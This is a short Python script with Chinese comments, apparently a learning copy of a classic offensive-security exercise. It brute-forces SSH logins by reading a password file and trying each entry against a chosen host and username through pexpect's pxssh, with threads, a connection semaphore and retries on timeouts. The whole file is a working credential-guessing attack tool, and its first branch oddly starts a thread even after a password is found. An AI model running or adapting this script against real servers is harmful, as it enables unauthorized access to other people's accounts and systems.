# coding=utf-8
# python3
# by 此意系

from pexpect import pxssh
import optparse
import time
from threading import *

maxConnections = 5

connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(host, user, password, release):
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        # 利用pxssh类的login()方法进行ssh登录
        s.login(host, user, password)
        print('[+] Password is: ' + password)
        Found = True
    except Exception as e:
        # SSH服务器可能被大量的连接刷爆，等待一会再连接
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            # 递归调用的connect()，不可释放锁
            connect(host, user, password, False)
        # 显示pxssh命令提示符提取困难，等待一会再连接
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            # 递归调用的connect()，不可释放锁
            connect(host, user, password, False)
    finally:
        if release:
            # 释放锁
            connection_lock.release()


def main():
    parser = optparse.OptionParser('usage % prog'+'-H <target host> -u <username> -f <password file>')
    parser.add_option('-H', dest='host', type='string', help='specify target host')
    parser.add_option('-u', dest='username', type='string', help='target username')
    parser.add_option('-f', dest='file', type='string', help='specify password file')
    (options, args) = parser.parse_args()

    if (options.host == None) | (options.username == None) | (options.file == None):
        print(parser.usage)
        exit(0)

    host = options.host
    username = options.username
    file = options.file

    fn = open(file, 'r')
    for line in fn.readlines():

        if Found:
            print('[*] Exiting: Password Found')
            exit(0)

        if Fails > 5:
            print('[!] Exiting: Too Many Socket Timeouts')
            exit(0)

        # 加锁
        connection_lock.acquire()

        # 去掉换行符，其中Windows为'\r\n'，Linux为'\n'
        password = line.strip('\r').strip('\n')
        if Found :
            t = Thread(target=connect, args=(host, username, password, True))
            child = t.start()
        else:
            print('[-] Testing: ' + str(password))

            # 不是递归调用的connect()，可以释放锁
            t = Thread(target=connect, args=(host, username, password, True))
            child = t.start()


if __name__ == '__main__':
    main()

